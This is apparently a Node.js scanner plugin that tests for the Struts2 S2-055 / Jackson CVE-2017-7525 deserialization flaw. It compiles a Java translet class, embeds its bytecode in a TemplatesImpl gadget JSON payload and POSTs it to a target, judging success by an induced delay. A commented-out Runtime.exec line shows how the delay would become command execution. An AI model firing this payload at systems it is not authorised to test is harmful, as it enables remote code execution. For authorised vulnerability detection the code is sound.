module.exports={
	tags:"struts2,055,CVE-2017-7525,7525,parms",
	des:"struts2 055Vulnerability detection,",
	dependencies:"javac",
	VulApps:["https://github.com/FasterXML/jackson-databind/issues/1599",
		"https://github.com/iBearcat/S2-055",
		"https://raw.githubusercontent.com/iBearcat/S2-055/master/struts2-rest-showcase.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-055",
		"http://www.baeldung.com/jackson-exception",
		"https://github.com/FasterXML/jackson-databind/issues/1737",
		"https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/"],
	test:"node checkUrl.js -u 'http://192.168.10.216:8088/struts2-rest-showcase/orders/new' --struts2 055",
/*
nc -v 192.168.10.216 8088
POST /struts2-rest-showcase/orders HTTP/1.1
Host: 192.168.10.216:8088
User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; OPPO A33 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043409 Safari/537.36 V1_AND_SQ_7.1.8_718_YYB_D PA QQ/7.1.8.3240 NetType/4G WebP/0.3.0 Pixel/540
content-type: application/json
connection: close
content-length: 1992

*/
	doCheck:function(url,fnCbk,parms)
	{
		var _t = this,_s = _t.self,hst = _s.parseUrl(url);
		if(!parms)
		{
			_s.request(_s.fnOptHeader({method: 'GET',uri: url,
				headers:
				{
					"Host":hst.host,
	  		    	"User-Agent": _s.g_szUa}
				}),
		    	function(e,r,b)
		    {
		    	if(!e && b)
		    	{
		    		// console.log(b);
		    		_s.fnDoBody(b,"s2-055",url,null,function(o){});
		    	};
		    });
			return;
		}

		parms || (parms = {});
		var nNum = new Date().getTime()/1000,
		    // 延时测试
			nTime = (parseInt(Math.random() * 1000000000)%18 + 7) * 1000, 
			szJavaFileName = "MTXjava" + (nTime / 1000),
			aPayload = [_s.fnMyHelp(function(){
/*
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class MTXjava extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet implements java.io.Serializable{
    public MTXjava()
    {
        try{
            // java.lang.Runtime.getRuntime().exec("touch /tmp/mtx.txt");
            Thread.sleep(5000);
        }catch(Exception e){}
        System.out.println("Ok MTX hello");
    }
    public static void main(String[] args) {
        new MTXjava();   
    }
    @Override
	public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

	}
	@Override
	public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
			throws TransletException {
	}
}
*/
})];
		// 创建攻击参数
		var fnMkPl = function(s)
		{
			var a = ['"',,'":["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{"transletBytecodes":["',,'"],"transletName":"p","outputProperties":{ },"_name":"a","_version":"1.0","allowedProtocols":"all"}]'],b = [];
			for(var i in parms)
			{
				a[1] = i;
				a[3] = s;
				b.push(a.join(""));
			}
			return ["{",b.join(","),"}"].join("");
		};
		
		for(var i = 0; i < aPayload.length; i++)
		{
			var szT = aPayload[i].replace(/MTXjava/gmi,szJavaFileName).replace(/5000/gmi,nTime),
				szPayload = '';
			// 创建临时java文件
			_s.fs.writeFileSync(szJavaFileName + ".java", szT);
			// console.log(__dirname + "/../../jars/jaxb-xalan-1.5.jar");
			// 编译文件
			_s.child_process.execSync("javac -nowarn -g:none -classpath " + __dirname + "/../../jars/jaxb-xalan-1.5.jar " + szJavaFileName + ".java 2>/dev/null;rm -rf " + szJavaFileName + ".java");
			// 删除临时文件
			_s.fs.unlinkSync(szJavaFileName + ".java");
			// 读取class,生成攻击验证代码
			szPayload = fnMkPl(_s.fs.readFileSync(szJavaFileName + '.class').toString("base64"));
			// 删除临时文件
			_s.fs.unlinkSync(szJavaFileName + ".class");
			// 发送payload
			_s.log('发送payload: ');
			_s.log(szPayload);
			var oOpt = _s.fnOptHeader({method: 'POST',uri: url,
				body:szPayload,
				headers:
				{
					"Host":hst.host,
	  		    	"User-Agent": _s.g_szUa,
	  		    	"content-type":"application/json"}
				});
			oOpt.timeout = nTime + 5000;
			_s.request(oOpt,
		    	function(e,response,b)
		    {
		    	// 判断、识别延时情况，确定是否存在漏洞
		    	_s.error(e);
		    	// console.log(b);
		    	// _s.fnShowBody(b);
		    	var nT = new Date().getTime()/1000 - nNum,nT2 = nTime / 1000 - 5;
		    	var r = {};
		    	if(response && response.request)_s.log([nT,nT2,response.request.uri.href]);
		    	if(nT >= nT2)
		    	{
		    		r = {
		    			"url":url,
		    			des:"发现struts2-rest Jackson高危漏洞 CVE-2017-7525反序列化, 延时" + (nTime/1000) + "秒，实际返回耗时：" + nT + "秒",
		    			"send":szPayload,
		    			vul:true,
		    			tags:_t.tags,
		    			href:response && response.request && response.request.uri.href||''};
		    		fnCbk(r,_t);
		    	}
		    	else _s.log(b);
		    	/*
		    	_s.fnDoBody(b,"s2-055",url,null,function(o)
		    	{
	  				fnCbk(_s.copyO2O(r,o),_t);
		    	});///*/
		    });
	    }
	}
};